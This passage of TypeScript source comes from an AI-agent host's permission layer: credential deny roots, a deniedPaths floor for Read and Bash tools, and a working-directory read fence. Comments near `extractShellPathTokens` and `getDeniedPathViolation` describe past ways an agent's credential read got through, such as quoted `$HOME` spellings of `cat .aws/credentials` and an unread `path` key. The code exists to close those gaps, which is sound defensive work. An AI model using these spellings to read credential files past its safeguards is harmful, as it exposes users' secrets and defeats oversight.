 * `$XDG_CONFIG_HOME` is its PARENT, and gh's directory is `<that>/gh`.
 * `gitlab-org/cli/internal/config/config_file.go` names, in order,
 * `$GLAB_CONFIG_DIR/config.yml`, `~/.config/glab-cli/config.yml`,
 * `$XDG_CONFIG_HOME/glab-cli/config.yml` and `$XDG_CONFIG_DIRS/…`, so
 * `$GLAB_CONFIG_DIR` is likewise the directory itself.
 *
 * ## What `NESSY_CONFIG_DIR` contributes, measured
 *
 * `<config dir>/credentials.enc` — the one entry `credentialDenyRoots` builds
 * from `configDir`. Measured 2026-09-07 with a fake `HOME` and a relocated
 * config dir under a temp dir, the unprefixed `**` + `/credentials.enc` glob
 * ALREADY refused it, so this root is belt beside braces rather than a fix. It
 * is here so the request-side floor states its own dependency on the config dir
 * instead of inheriting it from one glob's spelling. `dp_auth_creds.json` is
 * NOT under the config dir at all — `packages/shared/src/auth/dp/creds-store.ts`
 * symbol `getCredsPath` resolves it under `latchedHomeDir()`, and `~/.nessy/**`
 * covers it; the row that asked for it here named a file that does not live
 * here.
 *
 * ## What `NESSY_HOME` contributes — DA1.5, and it is the load-bearing one
 *
 * The sentence above holds only while the nessy directory IS `~/.nessy`.
 * `packages/shared/src/auth/dp/creds-store.ts` symbol `getNessyDir` now honours
 * `NESSY_HOME`, nessy-cli's own variable for that directory, so the gateway JWT
 * can sit anywhere — and `SAFE_MODE_CONFIG.deniedPaths`' `~/.nessy/**` is a
 * `~`-anchored glob that cannot reach it. This entry is what makes the
 * request-side floor follow the relocation; without it the variable would be a
 * switch that moves the credential out of every read-side protection, and with
 * isolation off by default this is the protection that matters.
 *
 * Additive, like every entry here: `~/.nessy/**` keeps covering the default
 * directory, so a value set mid-session cannot un-deny the one the session has
 * been writing to. `add` already refuses a non-absolute value, which is exactly
 * and deliberately `getNessyDir`'s own whole rule, so the store and this floor
 * resolve the variable identically with no shared code — the two packages are
 * on opposite sides of a dependency edge and cannot share any.
 *
 * A RELATIVE value is refused rather than resolved: `process.cwd()` in this
 * package is the app's own directory, not the session's, so resolving one would
 * deny a path nobody meant and leave the real directory open.
 */
export function relocatedCredentialDenyRoots(
  env: Record<string, string | undefined> = process.env,
): readonly RelocatedCredentialRoot[] {
  const roots: RelocatedCredentialRoot[] = [];
  const add = (origin: string, value: string | undefined, ...parts: string[]): void => {
    if (typeof value !== 'string') return;
    const trimmed = value.trim();
    if (trimmed.length === 0 || !isAbsolute(trimmed)) return;
    roots.push({ root: resolve(trimmed, ...parts), origin });
  };
  add('NESSY_CONFIG_DIR', env.NESSY_CONFIG_DIR, 'credentials.enc');
  // Named by P6.678's `done_means` and kept although the measurement says the
  // file is not here: `auth/dp/creds-store.ts:48` resolves it under
  // `latchedHomeDir()`, and `~/.nessy/**` already refuses it. One comparison,
  // deny-only, and it means a copy written beside the encrypted store by
  // anything sharing this directory is covered rather than argued about.
  add('NESSY_CONFIG_DIR', env.NESSY_CONFIG_DIR, 'dp_auth_creds.json');
  // The WHOLE relocated directory, for the reason `~/.nessy/**` is a whole
  // directory: `dp_auth_creds.json.bak` / `.bak2` copies of the same token are
  // written beside it by something outside our control, and `oauth_creds.json`
  // — the nessy-cli seed our warm path reads — is in there too.
  add('NESSY_HOME', env.NESSY_HOME);
  add('GH_CONFIG_DIR', env.GH_CONFIG_DIR);
  add('GLAB_CONFIG_DIR', env.GLAB_CONFIG_DIR);
  add('XDG_CONFIG_HOME', env.XDG_CONFIG_HOME, 'gh');
  add('XDG_CONFIG_HOME', env.XDG_CONFIG_HOME, 'glab-cli');
  // `XDG_CONFIG_DIRS` is a colon-separated search path, and glab reads
  // `<entry>/glab-cli` from every entry on it.
  for (const entry of (env.XDG_CONFIG_DIRS ?? '').split(':')) {
    add('XDG_CONFIG_DIRS', entry, 'glab-cli');
  }
  return roots;
}

/** The relocated root a candidate falls inside, or null. */
function matchesRelocatedCredentialRoot(
  filePath: string,
  env: Record<string, string | undefined> = process.env,
): RelocatedCredentialRoot | null {
  const candidate = expandDenyCandidateHome(filePath);
  if (!isAbsolute(candidate)) return null;
  for (const entry of relocatedCredentialDenyRoots(env)) {
    if (isPathWithin(entry.root, candidate)) return entry;
  }
  return null;
}

function matchesDeniedToolPattern(toolName: string, deniedToolPatterns: string[] | undefined): string | null {
  if (!deniedToolPatterns || deniedToolPatterns.length === 0) return null;

  for (const pattern of deniedToolPatterns) {
    try {
      const regex = globToRegex(pattern, 'cross');
      if (regex.test(toolName)) {
        debug(`[Mode] Tool "${toolName}" matches denied tool pattern "${pattern}"`);
        return pattern;
      }
    } catch (e) {
      debug(`[Mode] Invalid denied tool glob "${pattern}":`, e);
    }
  }

  return null;
}

export function matchesToolPattern(
  toolName: string,
  patterns: string[] | undefined,
  label: string
): string | null {
  if (!patterns || patterns.length === 0) return null;

  for (const pattern of patterns) {
    try {
      const regex = globToRegex(pattern, 'stop');
      if (regex.test(toolName)) {
        debug(`[Mode] Tool "${toolName}" matches ${label} pattern "${pattern}"`);
        return pattern;
      }
    } catch (e) {
      debug(`[Mode] Invalid ${label} glob "${pattern}":`, e);
    }
  }

  return null;
}

/**
 * First match wins, and P2.77 is about what decides "first".
 *
 * This loop is where SOURCE SLUG SPELLING becomes a permission verdict. The
 * `toolRules` it walks are the merged product of every active source's rules,
 * concatenated in the order `permissions-config.ts:normalizePermissionsContext`
 * sorted the slugs into — alphabetically. So when two sources name one tool with
 * opposite actions, `a-foo` beats `z-foo`, and nothing at either end used to say
 * why.
 *
 * The justification lives once, at the producer, because that is where the
 * choice is made: read `normalizePermissionsContext`'s § *Why ALPHABETICAL is
 * the tie-break* (lexicographic is the only ordering available there that is
 * stable and workspace-independent — every caller builds the slugs from
 * set-iteration order, i.e. from when each source happened to activate). What
 * belongs HERE is only the pointer, plus the fact that made the question worth
 * asking: this function turning the FIRST match into the answer is the entire
 * mechanism by which that ordering is load-bearing. Change the loop to
 * last-match or to a precedence the user can see, and the producer's reasoning
 * stops applying.
 */
export function matchesToolPermissionRule(
  toolName: string,
  toolRules: ToolPermissionRule[] | undefined
): ToolPermissionRule | null {
  if (!toolRules || toolRules.length === 0) return null;

  for (const rule of toolRules) {
    try {
      const regex = globToRegex(rule.pattern, 'stop');
      if (regex.test(toolName)) {
        debug(`[Mode] Tool "${toolName}" matches toolRules pattern "${rule.pattern}"`);
        return rule;
      }
    } catch (e) {
      debug(`[Mode] Invalid toolRules glob "${rule.pattern}":`, e);
    }
  }

  return null;
}
import { toolRuleUnderSessionToolStandIn } from './pi-harness/session-tool-rule-alias.ts'; // F1.1175; here so no cited line moves
function formatToolRuleDescription(toolName: string, rule: ToolPermissionRule): string {
  return [
    `Tool ${toolName} matched toolRules pattern ${rule.pattern}.`,
    rule.comment,
  ].filter(Boolean).join(' ');
}

function isPathLikeShellToken(token: string): boolean {
  return (
    token.startsWith('/') ||
    token.startsWith('~/') ||
    token.startsWith('./') ||
    token.startsWith('../') ||
    token.startsWith('.') ||
    token.includes('/')
  );
}

function collectShellPathTokens(command: string, into: Set<string>): void {
  const tokenPattern = /"([^"]+)"|'([^']+)'|([^\s"'|&;<>()[\]{}]+)/g;

  for (const match of command.matchAll(tokenPattern)) {
    const token = match[1] ?? match[2] ?? match[3];
    if (!token) continue;
    const cleaned = token.replace(/^[=:]+|[,.:]+$/g, '');
    if (cleaned && isPathLikeShellToken(cleaned)) {
      into.add(cleaned);
    }
  }
}
import { neutralizeQuotedHeredocBackticks } from './quoted-heredoc-backticks.ts'; // F1.761; here so no cited line moves
function extractShellPathTokens(rawCommand: string): string[] {
  const tokens = new Set<string>();
  const command = neutralizeQuotedHeredocBackticks(rawCommand); // a quoted heredoc body's backticks run nothing
  collectShellPathTokens(command, tokens);
  // P6.673. Two PUNCTUATION spellings split a path into pieces that are each
  // harmless, and the floor then judged the pieces:
  //
  //   `cat "$HOME"/.aws/credentials` is three tokens to the reader above —
  //   `cat`, the quoted `$HOME`, and `/.aws/credentials` — so the floor saw an
  //   absolute `/.aws/credentials`, which no home-anchored pattern covers, and
  //   allowed the read.
  //
  //   `cat ${HOME}/.aws/credentials` splits the same way, because the token
  //   class deliberately stops at a brace.
  //
  // Re-reading one copy with the quotes dropped and braced variable names
  // unwrapped recovers the token the shell will actually build. It is additive
  // by construction — every token this produces can only ever yield a DENY, so a
  // second reading cannot widen the floor — which is the same argument
  // `powerShellWriteTargetCandidates` is admitted on.
  const unpunctuated = command.replace(/['"]/g, '').replace(/\$\{([A-Za-z_][A-Za-z0-9_]*)\}/g, '$$$1');
  if (unpunctuated !== command) collectShellPathTokens(unpunctuated, tokens);

  return [...tokens];
}
import { deniedPathRealCandidates, deniedPathRealTargets, deniedPathsWithRealAnchors } from './denied-path-real-target.ts'; // F1.711, F1.1120; here so no cited line moves
/**
 * The `deniedPaths` floor, per tool — and it reads BOTH backends' vocabularies.
 *
 * Two spellings decide whether the floor fires at all, and both of them were
 * Claude-only here while the same file already knew better:
 *
 * 1. **The argument key.** Claude's SDK sends `file_path`; Pi's `read`/`edit`/
 *    `write` send `path` (`local-tools/runtime-backed-tools.ts`
 *    `READ_PARAMETERS`/`WRITE_PARAMETERS`), forwarded to this gate verbatim by
 *    `requestPiPermissionReceipt` → `handlePreToolUseRequest` → `input`. Reading
 *    only `file_path` therefore read `undefined` for the whole Pi backend, so
 *    `Read {path: '~/.aws/credentials'}` was OPEN in EVERY mode while the same
 *    file under `file_path` was DENIED in the same run.
 *    {@link extractFileToolTargetPath} — 100 lines below, with a docstring
 *    naming this exact drift — was added for the path-scoped decisions and never
 *    reached the floor.
 * 2. **The tool name.** `Glob` is Claude's name for file discovery. Pi reaches
 *    the gate under `PI_TOOL_BINDINGS`' `permissionName`, which is `Find` for
 *    the glob tool and `Ls` for the directory listing — neither had a branch,
 *    so P3.104's container fix (`~/.ssh/**` must deny `~/.ssh` itself) was inert
 *    on the two Pi tools that actually take a directory. `FILE_PATH_TOOLS`
 *    (`core/pre-tool-use.ts`) had already been widened for both names; this had
 *    not, and `denied-path-tool-vocabulary.test.ts` now pins the two together.
 *
 * F1.711 — a file-tool or search target is ALSO judged at its real path
 * ({@link deniedPathRealTargets}); a `Bash` token is ALSO judged at its real path, and a deny pattern is re-anchored at the real location of a symlinked folder (F1.1120, {@link deniedPathsWithRealAnchors}).
 */
function getDeniedPathViolation(
  toolName: string,
  toolInput: unknown,
  config: ToolCheckConfig, relativeBases: readonly (string | undefined)[] = [] // F1.1120: a relative target is the SESSION folder's, not process.cwd()'s; UB12.60: and where the runtime's tools run
): { path: string; pattern: string } | null {
  const input = toolInput as Record<string, unknown> | null;
  const candidates: string[] = [];

  if (toolName === 'Read' || toolName === 'Write' || toolName === 'Edit' || toolName === 'MultiEdit'
    || toolName === 'NotebookEdit') {
    const target = extractFileToolTargetPath(input);
    if (target) {
      candidates.push(target, ...deniedPathRealCandidates(target, expandDenyCandidateHome, relativeBases)); // F1.711: the link's target too; F1.1120: a RELATIVE target resolves against the SESSION folder first
    }
  } else if (toolName === 'Glob' || toolName === 'Grep' || toolName === 'Find' || toolName === 'Ls') {
    if (typeof input?.path === 'string') {
      candidates.push(input.path, ...deniedPathRealCandidates(input.path, expandDenyCandidateHome, relativeBases)); // F1.711; F1.1120: same relative resolution
    }
  } else if (toolName === 'Bash') {
    const command = typeof input?.command === 'string' ? input.command : '';
    const writeTarget = extractBashWriteTarget(command) ?? extractPowerShellWriteTarget(command);
    if (writeTarget) {
      candidates.push(writeTarget, ...deniedPathRealCandidates(writeTarget, expandDenyCandidateHome, relativeBases)); // F1.1120: the write target's real path too
    }
    for (const token of extractShellPathTokens(command)) candidates.push(token, ...deniedPathRealCandidates(token, expandDenyCandidateHome, relativeBases)); // F1.1120: a token is ALSO judged at its real path, relative ones against the SESSION folder
    // P3.332 — `extractPowerShellWriteTarget` answers `null` both when the
    // command writes nothing AND when the parser REFUSED (spawn timeout,
    // EAGAIN/EMFILE under a fan-out, missing parser script). The floor read the
    // second as the first, so a refusal arrived here as "names no path".
    // `powerShellWriteTargetCandidates` is spawn-free and additive: every entry
    // it returns can only produce a DENY, so it cannot widen this check, and it
    // is deliberately absent from the plans/data ALLOW exception below, where a
    // target GRANTS permission and a guess would manufacture one.
    candidates.push(...powerShellWriteTargetCandidates(command));
  }

  for (const candidate of candidates) {
    const pattern = matchesDeniedPath(candidate, config.deniedPaths);
    if (pattern) {
      return { path: candidate, pattern };
    }
    // P6.678 — the roots the static glob array cannot name, because they are
    // wherever an environment variable put them. Checked AFTER the globs so the
    // ordinary refusal still names the operator's own pattern, and reported
    // under the variable that moved the directory.
    const relocated = matchesRelocatedCredentialRoot(candidate);
    if (relocated) {
      return { path: candidate, pattern: `$${relocated.origin} (${relocated.root})` };
    }
  }

  return null;
}

/**
 * P6.202 — the READ-side working-directory fence, and the only mode-independent
 * floor on this file that an operator turns on rather than one we always apply.
 *
 * ## The contract, from the page rather than from the bundle
 *
 * `settings-reference.md#permissions-blockreadsoutsideworkingdirectories`:
 * *"Stop Claude from reading paths outside the session's working directories
 * with the Read, Grep, Glob, and LSP tools, in every permission mode including
 * `bypassPermissions`."* And `permission-modes.md#actions-no-mode-auto-approves`
 * lists it among the things *"Claude Code doesn't auto-approve … in any mode,
 * including `bypassPermissions`"*.
 *
 * Derived from the PAGE deliberately: the bundle SELF-REPORTED `2.1.247` on 2026-09-11
 * and `2.1.251` on 2026-09-17 (re-derive it, never quote — the D1.167 disposition) and the page says
 * *"Requires Claude Code v2.1.257 or later"*, so probing the bundle for the key
 * returns 0 — re-measured 2026-09-11 over `sdk.d.ts`, `sdk.mjs` AND the native
 * binary, all three zero against `permissionMode` 6/8/369 as the positive
 * control and a fabricated key 0/0/0 as the negative — and would have read as
 * "no such setting". This is the bundle-lags-the-page direction AGENTS.md names,
 * where the documentation is the denominator.
 *
 * ## C3.5 — WHICH REFUSAL WINS when the bundle reaches 2.1.257, decided now
 *
 * On the day the vendor's own key becomes real there are two candidate
 * executors of one setting, and a user who meets both would be refused twice
 * under two different names. The rule is therefore pinned here rather than
 * discovered on the lift, and the tripwire that fires on that day is
 * `config/__tests__/claude-vendored-sdk-contract.test.ts` §C3.5, which carries
 * the same decision inside its compared value so the person who bumps the SDK
 * reads it without knowing this row exists.
 *
 * **THE HOST FENCE IS EVALUATED FIRST, and that is the runtime's own ordering
 * rather than a preference of ours.** `agent-sdk/permissions.md#how-permissions-are-evaluated`
 * lists six steps, and step 1 is Hooks: *"Run hooks first. A hook can deny the
 * call outright or pass it on."* Settings-file permission rules are step 2
 * (Deny rules). This fence reaches claude through a `PreToolUse` hook — the one
 * `runPreToolUseChecks` call site in `claude-agent.ts` — so it decides at step 1,
 * ahead of anything a settings file could say. With both switches on, the user
 * meets ONE refusal, ours, naming the setting they turned on in this app.
 *
 * **THE VENDOR KEY IS DELIBERATELY NOT PASSED**, and the reason is not that the
 * native mechanism is unwanted:
 *
 *  - It does not exist on the runtime we ship (the three zeros above), so
 *    writing it today would put an unknown key in the child's settings.
 *  - Given the ordering above, a mirrored key could only ever fire on calls this
 *    hook has already refused — on the tools this fence covers it can add
 *    nothing.
 *  - It would add exactly one thing, and that thing is a PRODUCT POSTURE rather
 *    than a wiring detail: the page's own *"A Bash command that reads a matching
 *    path through a file command Claude Code recognizes, such as `cat`, prompts
 *    you even in auto mode and `bypassPermissions` mode"*. This fence is a
 *    TOOL-NAME predicate (the set below), so Bash `cat` rests on the
 *    `deniedPaths` floor beside it — the residue ledger row A28 stays `partial`
 *    for. Turning the vendor key on would close that on claude ALONE, while Pi
 *    keeps the tool-name fence and codex has no subject at all (P6.928's owner
 *    ruling), which is a one-runtime divergence in what one user-owned setting
 *    means. The native-first rule's second half (AGENTS.md) says the host must
 *    make such a difference uniform or honest, and a switch verdict is the
 *    owner's; so it is recorded as a flip candidate, not taken quietly.
 *  - Mechanically it is also a landmine: `composeClaudeSpawnSettings`
 *    (`agent/claude-agent.ts`) merges spawn settings by TOP-LEVEL key, so a
 *    contributor writing `permissions` owns the whole object and a second
 *    `permissions` writer is dropped with a collision notice. A fence
 *    contributor would therefore silently disable any future spawn-time
 *    `permissions.deny` contributor, or be disabled by it.
 *
 * A user who wants the vendor's fence is not blocked by this: we pass
 * `settingSources: ['user', 'project', 'local']`, so their own
 * `.claude/settings.json` key is loaded and enforced by the SDK the day it
 * becomes real. What we decline is MIRRORING our setting into theirs.
 *
 * ## Why it sits HERE, beside `getDeniedPathViolation`
 *
 * Because the page says *every permission mode including `bypassPermissions`*,
 * and the only place in this function that binds in every mode is above the
 * `bypassPermissions` early return — the same seam `getDeniedPathViolation` and
 * P6.212's self-kill guard already occupy. A check placed anywhere below it
 * would be a fence with a documented hole.
 *
 * ## What it does NOT do
 *
 * It does not prompt. The page is explicit that a read outside the working
 * directories is otherwise ORDINARY: `default` mode's row in
 * `permission-modes.md#available-modes` reads *"Reads only"* run without asking,
 * and `permissions.md#working-directories` says additional directories *"become
 * readable without prompts"*. The one place a read outside prompts is auto
 * mode's FIRST such read (`permission-modes.md#first-read-outside-the-working-directories`),
 * which is a separate card and a separate row. So this is a refusal or nothing.
 *
 * ## The two ways it declines to answer, both fail OPEN and both are deliberate
 *
 * With the fence off, or with no working directory known, it returns `null`. A
 * caller that cannot say where the session is rooted cannot be given a
 * containment verdict, and inventing one — falling back to `process.cwd()`, say
 * — would fence a path against whichever directory the app happened to be
 * launched from. That is the same hazard `resolveAdditionalDirectories` records
 * for relative entries, and the same answer.
 */
const READS_OUTSIDE_WORKING_DIRECTORIES_TOOLS = new Set([
  // Claude's file-reading vocabulary, verbatim from the page: "the Read, Grep,
  // Glob, and LSP tools".
  'Read', 'Grep', 'Glob',
  // ...and Pi's own names for the same two discovery tools, which reach this
  // gate through `PI_TOOL_BINDINGS`' `permissionName`. Omitting them is the
  // exact defect `getDeniedPathViolation`'s docblock records one screen above:
  // a Claude-only vocabulary leaves the whole Pi backend outside the floor.
  'Find', 'Ls',
]);

function getReadsOutsideWorkingDirectoriesViolation(
  toolName: string,
  toolInput: unknown,
  options: {
    blockReadsOutsideWorkingDirectories?: boolean;
    workingDirectory?: string;
    additionalDirectories?: string[]; dataFolderPath?: string; // F1.708: the session directory a relative call_llm attachment resolves under
  },
): { path: string } | null {
  if (options.blockReadsOutsideWorkingDirectories !== true) return null;
  if (!READS_OUTSIDE_WORKING_DIRECTORIES_TOOLS.has(toolName)) return firstCallLlmAttachmentAsRead(toolName, toolInput, options.dataFolderPath, read => getReadsOutsideWorkingDirectoriesViolation('Read', read, options)); // F1.708
  const workingDirectory = options.workingDirectory?.trim();
  if (!workingDirectory) return null;

  const input = toolInput as Record<string, unknown> | null;
  const target = toolName === 'Read'
    ? extractFileToolTargetPath(input)
    : (typeof input?.path === 'string' ? input.path : undefined);
  // A `Grep`/`Glob` with no `path` searches the working directory itself, which
  // is inside the fence by definition. Nothing to refuse.
  if (!target) return null;

  if (isPathWithinDirectory(target, workingDirectory)) return null;
  if (findContainingAdditionalDirectory(target, options.additionalDirectories)) return null;
  // The page's own carve-out: "Files Claude Code itself needs stay readable,
  // such as your skills, plugins, rules, agents, commands, and the `CLAUDE.md`
  // memory file under `~/.claude/`." Ours all live under one directory, so the
  // carve-out is one containment check rather than a list that would go stale
  // the day a seventh kind of host file is added.
  if (isPathWithinDirectory(target, CONFIG_DIR)) return null;

  return { path: target };
}

/**
 * P6.202 clause (3) — should auto mode ASK about this read, being the first one
 * outside the working directories?
 *
 * `permission-modes.md#first-read-outside-the-working-directories` (an explicit
 * `<h3 id=…>` on the rendered page), verbatim: *"While
 * `permissions.blockReadsOutsideWorkingDirectories` is off, file reads run
 * without a prompt in auto mode, including reads outside the working
 * directories. The first time Claude uses the Read, Grep, or Glob tool on a path
 * outside them, Claude Code asks you whether to keep allowing those reads."*
 *
 * ## Every condition is the page's, and each one can refuse on its own
 *
 *  - **auto mode only.** The sentence is inside auto mode's section and names it.
 *    In every other mode a read outside is ordinary (`#available-modes` gives
 *    `default` "Reads only" without asking), which is why clause (1) of this row
 *    was STRUCK: the vendor has two mechanisms here, not three.
 *  - **the fence is OFF.** *"While … is off"*. With it on, the read is REFUSED by
 *    {@link getReadsOutsideWorkingDirectoriesViolation} and there is nothing to
 *    ask about; asking and then refusing would be two answers to one question.
 *  - **a read tool**, the same set the fence uses — Claude's `Read`/`Grep`/`Glob`
 *    plus Pi's `Find`/`Ls`, for the same reason recorded there.
 *  - **outside the working directories**, measured with the same containment
 *    helpers and the same `CONFIG_DIR` carve-out, so the prompt and the fence can
 *    never disagree about what "outside" means.
 *  - **the FIRST one**: a session that already answered **Keep allowing** is never
 *    asked again.
 *  - **an interactive session.** *"The prompt doesn't appear in non-interactive
 *    `-p` runs or background sessions; reads there run as before."*
 *
 * ## `interactive` is required from the caller, and absence means "do not ask"
 *
 * This module has no way to tell a `-p` run from a windowed session, and
 * inventing one would be the `process.cwd()` mistake in a second costume. So the
 * caller states it, and an unstated caller gets `false` — which is exactly the
 * page's own outcome for those sessions, *"reads there run as before"*, rather
 * than a prompt nobody can answer.
 *
 * Returns the CARD PAYLOAD when the answer is yes, so the producer has nothing
 * left to compute, and `null` — meaning "let the read run" — otherwise. It never
 * returns a refusal: refusing is the fence's job, one screen up.
 */
export function resolveFirstOutsideWorkingDirectoryRead(
  key: SessionKey,
  toolName: string,
  toolInput: unknown,
  options: {
    permissionMode: PermissionMode;
    blockReadsOutsideWorkingDirectories?: boolean;
    workingDirectory?: string;
    additionalDirectories?: string[];
    interactive?: boolean; dataFolderPath?: string; // F1.708: as the fence's
  },
): { path: string; tool: string; workingDirectory?: string } | null {
  if (options.permissionMode !== 'auto') return null;
  if (options.blockReadsOutsideWorkingDirectories === true) return null;
  if (options.interactive !== true) return null;
  if (!READS_OUTSIDE_WORKING_DIRECTORIES_TOOLS.has(toolName)) return firstCallLlmAttachmentAsRead(toolName, toolInput, options.dataFolderPath, read => resolveFirstOutsideWorkingDirectoryRead(key, 'Read', read, options)); // F1.708
  if (modeManager.getState(key).outsideWorkingDirectoryReads === 'keep-allowing') return null;

  const workingDirectory = options.workingDirectory?.trim();
  if (!workingDirectory) return null;

  const input = toolInput as Record<string, unknown> | null;
  const target = toolName === 'Read'
    ? extractFileToolTargetPath(input)
    : (typeof input?.path === 'string' ? input.path : undefined);
  // A `Grep`/`Glob` with no `path` searches the working directory itself.
  if (!target) return null;

  if (isPathWithinDirectory(target, workingDirectory)) return null;
  if (findContainingAdditionalDirectory(target, options.additionalDirectories)) return null;
  if (isPathWithinDirectory(target, CONFIG_DIR)) return null;

  return { path: target, tool: toolName, workingDirectory };
}

/** What one of the three answers does, for the producer that has to do it. */
export interface OutsideWorkingDirectoryReadEffect {
  /** Let this read run. Only **Keep allowing** does. */
  readonly allowRead: boolean;
  /**
   * Write `permissions.blockReadsOutsideWorkingDirectories: true` to the USER
   * settings. Only **Block from now on** does, and the page says why it is the
   * user layer: *"which makes the file tools refuse such reads in every later
   * session and every permission mode"*.
   */
  readonly blockFromNowOn: boolean;
}

/**
 * P6.202 clause (3) — turn the card's two booleans into the page's three
 * answers, and record the one of them that persists.
 *
 * The encoding lives here rather than in each consumer so that the mapping is
 * stated ONCE; `FirstOutsideReadPermissionRequest` in `core/types/message.ts`
 * carries the same table in prose for the renderer that has to render it.
 *
 *  - `allowed` → **Keep allowing**: the read runs, and the answer is recorded on
 *    the session so *"the prompt doesn't appear again"*.
 *  - `!allowed && alwaysAllow` → **Block from now on**: refused, and the caller
 *    writes the settings key.
 *  - `!allowed && !alwaysAllow` → **Ask again next time**: refused, nothing
 *    recorded, so the next such read asks.
 *
 * Nothing is recorded for the two refusals ON PURPOSE — recording a refusal
 * would make **Ask again next time** stop asking, which is the one thing its
 * name promises it will not do.
 */
export function applyOutsideWorkingDirectoryReadAnswer(
  key: SessionKey,
  answer: { allowed: boolean; alwaysAllow: boolean },
): OutsideWorkingDirectoryReadEffect {
  if (answer.allowed) {
    modeManager.recordOutsideWorkingDirectoryReads(key, 'keep-allowing');
    return { allowRead: true, blockFromNowOn: false };
  }
  return { allowRead: false, blockFromNowOn: answer.alwaysAllow === true };
}

/**
 * Normalize a path for cross-platform comparison.
 * - Resolve to absolute path
 * - Convert backslashes to forward slashes
 * - Lowercase on Windows for case-insensitive comparison
 */
function normalizeForComparison(path: string): string {
  const normalized = resolve(path).replace(/\\/g, '/');
  return process.platform === 'win32' ? normalized.toLowerCase() : normalized;
}

function isWithin(base: string, target: string): boolean {
  const normalizedBase = normalizeForComparison(base);
  const normalizedTarget = normalizeForComparison(target);
  const rel = relative(normalizedBase, normalizedTarget);
  return rel === '' || (!rel.startsWith('..') && !isAbsolute(rel));
}

/**
 * Check whether targetPath is inside baseDir (or exactly equal to it).
 *
 * Uses path.relative semantics to avoid sibling-prefix bypasses and then
 * re-validates using real paths to prevent symlink escapes.
 */
function isPathWithinDirectory(targetPath: string, baseDir: string): boolean {
  // A Windows-shaped PAIR cannot be judged with this host's path semantics
  // unless this host is Windows: elsewhere a backslash is an ordinary filename
  // character, so `C:\ws\plans\p.md` is ONE component, `relative()` compares
  // two unrelated names and the ancestor walk below climbs past the whole path
  // to the process cwd -- which is how the plans-folder exception came to refuse
  // the writes it documents as allowed (P2.219). Decide those lexically, with
  // win32 semantics and case folded, and only when BOTH sides are Windows-shaped
  // so no POSIX base can be widened by it. On win32 this branch is skipped: the
  // host's own path module already parses these, and the realpath
  // re-validation below must keep guarding them against symlink escapes.
  if (
    process.platform !== 'win32' &&
    isWindowsStylePath(targetPath) &&
    isWindowsStylePath(baseDir)
  ) {
    return isWindowsPathWithinDirectory(targetPath, baseDir);
  }

  const expandedTarget = expandHome(targetPath);
  const expandedBase = expandHome(baseDir);

  const resolvedTarget = resolve(expandedTarget);
  const resolvedBase = resolve(expandedBase);
  if (!isWithin(resolvedBase, resolvedTarget)) {
    return false;
  }

  const realBase = existsSync(resolvedBase) ? realpathSync.native(resolvedBase) : resolvedBase;

  if (existsSync(resolvedTarget)) {
    const realTarget = realpathSync.native(resolvedTarget);
    return isWithin(realBase, realTarget);
  }

  // Target may be a new file path. Validate using nearest existing ancestor
  // to prevent symlink escapes while still allowing legitimate new files.
  let current = dirname(resolvedTarget);
  while (true) {
    if (existsSync(current)) {
      const realCurrent = realpathSync.native(current);
      return isWithin(realBase, realCurrent);
    }
    const parent = dirname(current);
    if (parent === current) {
      return false;
    }
    current = parent;
  }
}

/**
 * The path a file tool is about to touch, across every backend's spelling.
 *
 * Claude's SDK sends `file_path` (`notebook_path` for NotebookEdit); Pi's
 * `read`/`edit`/`write` tools send `path` (`local-tools/runtime-backed-tools.ts`,
 * `WRITE_PARAMETERS`) and reach this gate under the permission names
 * Write/Edit/Read. Reading only `file_path` left the target empty for the whole
 * Pi backend, which silently disabled every path-scoped decision there.
 */
export function extractFileToolTargetPath(input: unknown): string | undefined {
  const record = input as Record<string, unknown> | null | undefined;
  for (const key of ['file_path', 'notebook_path', 'path'] as const) {
    const value = record?.[key];
    if (typeof value === 'string' && value.trim()) return value;
  }
  return undefined;
}

function findContainingAdditionalDirectory(targetPath: string, directories: string[] | undefined): string | null {
  if (!directories || directories.length === 0) return null;

  for (const directory of directories) {
    const trimmed = directory.trim();
    if (!trimmed) continue;
    if (isPathWithinDirectory(targetPath, trimmed)) {
      return trimmed;
    }
  }

  return null;
}

// ============================================================
// Mode Manager Class
// ============================================================

/**
 * Manager for per-session permission mode state.
 * Each session has its own state - NO GLOBAL STATE.
 */
class ModeManager {
  private states: Map<string, ModeState> = new Map();
  private callbacks: Map<string, ModeCallbacks> = new Map();
  private subscribers: Map<string, Set<() => void>> = new Map();

  /**
   * Hydrate persisted transition context (previous mode) without mutating current mode/version.
   * Used on session restore so transition metadata can survive app restarts.
   */
  setPreviousPermissionMode(key: SessionKey, previousPermissionMode?: PermissionMode): void {
    const existing = this.getState(key);
    if (existing.previousPermissionMode === previousPermissionMode) {
      return;
    }

    const newState: ModeState = {
      ...existing,
      previousPermissionMode,
    };
    this.states.set(encodeSessionKey(key), newState);
  }

  /**
   * P6.202 clause (3) — record this session's answer to the first-read-outside
   * prompt. Only `'keep-allowing'` is ever stored; see
   * {@link ModeState.outsideWorkingDirectoryReads}.
   *
   * Deliberately NOT a mode change: it bumps no `modeVersion`, notifies no
   * subscriber and moves no mode. It is a session-scoped answer that happens to
   * live beside the mode because it is read on the same gate path, and a session
   * teardown already clears it through `cleanupSession`.
   */
  recordOutsideWorkingDirectoryReads(key: SessionKey, answer: 'keep-allowing'): void {
    const existing = this.getState(key);
    if (existing.outsideWorkingDirectoryReads === answer) return;
    this.states.set(encodeSessionKey(key), { ...existing, outsideWorkingDirectoryReads: answer });
  }

  /**
   * Get or create state for a session
   */
  getState(key: SessionKey): ModeState {
    const mapKey = encodeSessionKey(key);
    let state = this.states.get(mapKey);
    if (!state) {
      state = {
        sessionId: key.sessionId,
        permissionMode: 'default', // The manual mode until initialized
        modeVersion: 0,
        lastChangedAt: new Date().toISOString(),
        lastChangedBy: 'system',
      };
      this.states.set(mapKey, state);
    }
    return state;
  }

  /**
   * Set permission mode for a session.
   * @returns true when state changed, false when mode was unchanged
   */
  setPermissionMode(
    key: SessionKey,
    mode: PermissionMode,
    metadata?: { changedBy?: PermissionModeChangedBy; changedAt?: string }
  ): boolean {
    const mapKey = encodeSessionKey(key);
    const existing = this.getState(key);

    // No-op when mode is unchanged (prevents duplicate logs/events)
    if (existing.permissionMode === mode) {
      return false;
    }

    const changedAt = metadata?.changedAt ?? new Date().toISOString();
    const changedBy = metadata?.changedBy ?? 'unknown';

    const shouldTrackTransition = !(existing.modeVersion === 0 && changedBy === 'restore');

    const newState: ModeState = {
      ...existing,
      previousPermissionMode: shouldTrackTransition ? existing.permissionMode : undefined,
      permissionMode: mode,
